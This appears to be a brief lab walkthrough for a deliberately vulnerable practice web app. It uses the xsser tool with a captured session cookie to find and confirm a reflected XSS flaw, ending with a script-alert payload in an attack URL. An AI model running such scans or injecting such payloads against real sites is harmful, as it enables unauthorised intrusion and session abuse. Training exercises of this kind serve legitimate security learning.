

Select HTML Injection - Reflected (GET) exercise. Enter any value to the form for e.g hello and click on "Go"


: http://192.158.102.3/htmli_get.php?firstname=hello&lastname=hello&form=submit

- xsser --help

Refresh the webpage and copy the cookie Cookie: PHPSESSID=j278tohghcg7lbr220uhf4rg22; security_level=0

- xsser --url “http://192.158.102.3/htmli_get.php?firstname=XSS&lastname=hello&form=submit” --cookie=”PHPSESSID=j278tohghcg7lbr220uhf4rg22; security_level=0”

- xsser --url “http://192.158.102.3/htmli_get.php?firstname=XSS&lastname=hello&form=submit” --cookie=”PHPSESSID=j278tohghcg7lbr220uhf4rg22; security_level=0” --Fp “”

LAST PAYLOAD AFTER FINDING XSS

“http://192.158.102.3/htmli_get.php?firstname=XSS&lastname=hello&form=submit” --cookie=”PHPSESSID=j278tohghcg7lbr220uhf4rg22; security_level=0” --Fp "<script> alert(1)</script>"

Turn off burp suite intercept and open final attack link in firefox browser. URL: http://192.158.102.3/htmli_get.php?firstname=%3Cscript%3Ealert%281%29%3C%2Fscript%3E &lastname=hello&form=submit



